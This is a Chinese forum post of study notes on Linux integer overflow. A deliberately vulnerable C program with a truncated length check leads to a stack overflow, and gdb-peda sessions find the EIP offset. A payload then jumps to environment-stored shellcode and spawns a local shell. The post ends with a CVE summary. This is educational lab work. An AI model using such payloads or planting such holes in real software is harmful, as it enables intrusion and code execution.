
# [原创]Linux下面整数溢出,学习笔记分享.

## 0x00 准备

依然是在Ubuntu14.04上面关闭安全保护机制,实验代码取自[sploitfun](https://bbs.kanxue.com/elink@e23K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6M7r3I4G2K9i4c8X3N6h3&6Q4x3X3g2%4L8%4u0V1M7s2u0W2M7%4y4Q4x3X3g2U0L8$3#2Q4x3V1j5J5x3o6p5#2i4K6u0r3x3o6k6Q4x3V1j5J5x3#2)9J5c8X3W2F1N6r3g2Y4k6i4u0Q4x3X3c8G2N6X3g2J5k6X3I4G2N6#2)9J5c8R3`.`.).

### 什么是整数溢出?

存储的值超过类型系统最大的表示范围叫`interger overflow`,小于其最小表示范围叫`interger underflow`,整数溢出一般不会直接导致任意代码执行,但是会导致栈或者堆溢出间接引发任意代码执行,本笔记打算`interger overflow`导致`stack overflow`来说明问题.

### 类型系统与其的表示范围?

当我们存储值到变量里面,这个在类型语言里面(`c`, `c++`, `python`, `haskell`...)这个变量表示是有范围限制的,比如当我们打算存2147483648到`signed int`类型变量里面,在32位系统上面其表示最大值是`2^32-1`存储这样的值就会导致`integer overflow`,`unsigned int`类型其表示范围是`2^32-1`到0,当存储值小于最小表示下届时候,发生`integer underflow`.

#### 存在问题示例代码

```c
/* filename: vuln.c
 * gcc -g -fno-stack-protector -z execstack -o vuln vuln.c
 */

[*]include <stdio.h>
[*]include <string.h>
[*]include <stdlib.h>

void store_passwd_indb(char* passwd) {
}

void validate_uname(char* uname) {
}

void validate_passwd(char* passwd) {
 char passwd_buf[11];
 unsigned char passwd_len = strlen(passwd); /* [1] */
 if(passwd_len >= 4 && passwd_len <= 8) { /* [2] */
  printf("Valid Password\n"); /* [3] */
  fflush(stdout);
  strcpy(passwd_buf,passwd); /* [4] */
 } else {
  printf("Invalid Password\n"); /* [5] */
  fflush(stdout);
 }
 store_passwd_indb(passwd_buf); /* [6] */
}

int main(int argc, char* argv[]) {
 if(argc!=3) {
  printf("Usage Error:   \n");
  fflush(stdout);
  exit(-1);
 }
 validate_uname(argv[1]);
 validate_passwd(argv[2]);
 return 0;
}
```

标号`[1]`处显示了一个`integer overflow`,`strlen()`返回值类型是`size_t` (ubuntu下面定义为`unsigned int`), 但是例子代码处用来存储的是个`char`,`char`是8bit 显然是不能存储超过`2^8-1`,超出表示的部分虽然会被截断(虽然`strlen()`能正确找出,长度`eax`寄存器也能保存,但是放到`password_len`变量过程中导致问题),但是如果我们把第二个参数控制在255+5到255+8之间这样就能`bypass`下面的`if`检查,这样可以导致基于栈的缓冲区溢出!

## 0x10 分析

分析密码验证,输入256就已经超越了`char`的表示范围,可以看下面分析过程观察两次输入的`eax`寄存器,但这个程度只能算是一个小`bug`.

```
gdb-peda$ r guowang $(python -c 'print "A" * 256')
gdb-peda$ b validate_passwd
[-------------------------------------code-------------------------------------]
   0x804850d <validate_passwd+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x8048510 <validate_passwd+9>:	mov    DWORD PTR [esp],eax
   0x8048513 <validate_passwd+12>:	call   0x80483e0 <strlen@plt>
=> 0x8048518 <validate_passwd+17>:	mov    BYTE PTR [ebp-0x9],al
   0x804851b <validate_passwd+20>:	cmp    BYTE PTR [ebp-0x9],0x3
   0x804851f <validate_passwd+24>:	jbe    0x8048554 <validate_passwd+77>
   0x8048521 <validate_passwd+26>:	cmp    BYTE PTR [ebp-0x9],0x8
   0x8048525 <validate_passwd+30>:	ja     0x8048554 <validate_passwd+77>
...
gdb-peda$ info registers al
al             0xff	0xff
...
gdb-peda$ b validate_passwd
...
gdb-peda$ r guowang $(python -c 'print "A" * 256')
...
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804850d <validate_passwd+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x8048510 <validate_passwd+9>:	mov    DWORD PTR [esp],eax
   0x8048513 <validate_passwd+12>:	call   0x80483e0 <strlen@plt>
=> 0x8048518 <validate_passwd+17>:	mov    BYTE PTR [ebp-0x9],al
   0x804851b <validate_passwd+20>:	cmp    BYTE PTR [ebp-0x9],0x3
   0x804851f <validate_passwd+24>:	jbe    0x8048554 <validate_passwd+77>
   0x8048521 <validate_passwd+26>:	cmp    BYTE PTR [ebp-0x9],0x8
   0x8048525 <validate_passwd+30>:	ja     0x8048554 <validate_passwd+77>
...
gdb-peda$ info registers al
al             0x0	0x0
```

因为下面`cmp`检查了`strlen()`的返回值的长度所以:

```
[----------------------------------registers-----------------------------------]
EAX: 0x103
...
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804850d <validate_passwd+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x8048510 <validate_passwd+9>:	mov    DWORD PTR [esp],eax
   0x8048513 <validate_passwd+12>:	call   0x80483e0 <strlen@plt>
=> 0x8048518 <validate_passwd+17>:	mov    BYTE PTR [ebp-0x9],al
   0x804851b <validate_passwd+20>:	cmp    BYTE PTR [ebp-0x9],0x3
   0x804851f <validate_passwd+24>:	jbe    0x8048554 <validate_passwd+77>
   0x8048521 <validate_passwd+26>:	cmp    BYTE PTR [ebp-0x9],0x8
   0x8048525 <validate_passwd+30>:	ja     0x8048554 <validate_passwd+77>
[------------------------------------stack-------------------------------------]
```

这样是构造出绕过`if`检查的方式,但是导致了`crash`.

## 0x20 准备exp

寻找一下哪里覆盖`eip`.

```
gdb-peda$ pattern_arg 2 262
Set 2 arguments to program
gdb-peda$ r
...
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
...
EIP: 0x41414441 ('ADAA')
...
gdb-peda$ r AA $(python -c 'print "A" * 26 + "B" * 4 + "C" * (261-4-26)')
Starting program: /home/guowang/lab/vuln AA $(python -c 'print "A" * 26 + "B" * 4 + "C" * (261-4-26)')
Valid Password
Program received signal SIGSEGV, Segmentation fault.
...
EIP: 0x42424141 ('AABB')
...
gdb-peda$ r AA $(python -c 'print "A" * 24 + "B" * 4 + "C" * (261-4-24)')
Starting program: /home/guowang/lab/vuln AA $(python -c 'print "A" * 24 + "B" * 4 + "C" * (261-4-24)')
Valid Password
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xbffff584 ('A' <repeats 24 times>, "BBBB", 'C' <repeats 172 times>...)
EBX: 0xb7fcd000 --> 0x1a9da8
ECX: 0xbffff8a0 ("CCCCCCC")
EDX: 0xbffff682 ("CCCCCCC")
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff5a0 ('C' <repeats 200 times>...)
EIP: 0x42424242 ('BBBB')
```

大体上构造完成,把`BBBB`写入`eip`,然后正式准备一下使用`rop`构造一下`exp`这个整数溢出就算初步利用完成.

```
guowang@warzone:~/lab$ export SHELLCODE=$(cat shellcode.bin)
guowang@warzone:~/lab$ ./getaddr SHELLCODE ./vuln
SHELLCODE will be at 0xbffff848
guowang@warzone:~/lab$ ./vuln AA $(python -c 'print "A" * 24 + "\x48\xf8\xff\xbf" + "C" * (261-4-24)')
Valid Password
sh-4.3$ id
uid=1042(guowang) gid=1043(guowang) groups=1043(guowang)
sh-4.3$
```

## 0x40 现实世界

### 0x41 CVE-2012-0711

> Integer signedness error in the `db2dasrrm` process in the `DB2 Administration Server (DAS)` in IBM DB2 9.1 through FP11, 9.5 before FP9, and 9.7 through FP5 on UNIX platforms allows remote attackers to execute arbitrary code via a crafted request that triggers a `heap-based buffer overflow`.

这个CVE是`Integer Signedness`导致堆溢出后发生任意代码执行,待我学习到`heap`部分时候,尝试来分析一下这个漏洞,然后分享给大家.

reference

[1] [Phrack 0x0b, Issue 0x3c, Phile- 0x0a of 0x10](https://bbs.kanxue.com/elink@960K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4m8Z5M7X3q4U0K9#2)9J5k6h3!0J5k6#2)9J5c8X3W2K6M7%4g2W2M7#2)9J5c8U0j5H3i4K6u0r3x3e0m8Q4x3X3g2Z5N6r3#2D9)

[2] [sploitfun](https://bbs.kanxue.com/elink@bd6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6M7r3I4G2K9i4c8X3N6h3&6Q4x3X3g2%4L8%4u0V1M7s2u0W2M7%4y4Q4x3X3g2U0L8$3#2Q4x3V1j5J5x3o6p5#2i4K6u0r3x3o6k6Q4x3V1j5J5x3#2)9J5c8X3W2F1N6r3g2Y4k6i4u0Q4x3X3c8G2N6X3g2J5k6X3I4G2N6#2)9J5c8R3`.`.)

[3] [CVE-2012-0711](https://bbs.kanxue.com/elink@f5fK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3y4$3k6g2)9J5k6h3#2A6N6s2u0W2i4K6u0W2L8%4u0Y4i4K6u0r3j5$3N6A6i4K6u0V1j5X3W2F1i4K6u0r3j5%4k6W2L8X3q4E0k6g2)9J5k6h3y4Y4K9g2)9K6c8X3&6S2L8h3g2Q4x3@1c8o6g2V1g2Q4x3X3b7J5x3o6p5J5i4K6u0V1x3o6M7I4x3b7`.`.)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
